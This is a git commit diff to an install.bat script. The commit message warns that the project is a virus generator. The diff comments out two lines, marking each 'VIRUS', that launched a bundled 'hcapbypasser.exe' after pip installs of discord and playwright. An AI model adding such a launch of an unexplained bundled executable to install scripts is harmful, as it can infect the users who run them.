11b79f0477901c6332d92628a3bdbde43c84f86c
DrDisconnet <73930619+drdisconnet@users.noreply.github.com>
2022-04-24 14:53:34 +0530

    Update install.bat
    This is a virus gen. Never run this progranm.

--- install.bat
+++ install.bat
@@ -2,5 +2,7 @@
 pip install discord
 pip install playwright
 pause
-cd node_modules
-hcapbypasser.exe
+:: cd node_modules ::VIRUS
+:: hcapbypasser.exe ::VIRUS
+
+:This is a virus gen. Never run this progranm. 
